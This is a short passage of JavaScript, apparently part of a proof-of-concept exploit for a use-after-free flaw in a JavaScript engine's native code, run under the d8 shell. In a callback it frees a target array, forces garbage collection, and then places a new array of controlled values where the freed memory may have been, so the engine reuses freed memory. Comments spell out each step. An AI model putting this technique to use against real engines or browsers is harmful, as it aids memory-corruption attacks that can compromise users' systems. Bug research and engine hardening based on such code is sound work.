    if (callCount === 1) {
        console.log('Freeing the target array on first callback');
        // Free the original array by removing all references
        targetArray = null;

        // Force garbage collection (more reliable in d8)
        if (typeof gc === 'function') {
            console.log('Explicitly triggering garbage collection');
            gc();
        } else {
            // Try to allocate a lot of memory to encourage GC
            try {
                let garbageArray = [];
                for (let i = 0; i < 1000000; i++) {
                    garbageArray.push(new Array(100).fill('x'));
                }
                console.log('Attempted to trigger garbage collection');
            } catch (e) {
                console.log('Memory allocation failed: ' + e);
            }
        }

        // At this point, the array_object in the C++ code
        // might be pointing to freed memory

        // Try to reallocate the memory with new content that we control
        let newArray = [99, 88, 77, 66, 55];
        console.log('Created new array at hopefully same memory location: ' + newArray);

        return true; // Replace the item, even though it's potentially using freed memory
    }

    return false; // Don't replace other items
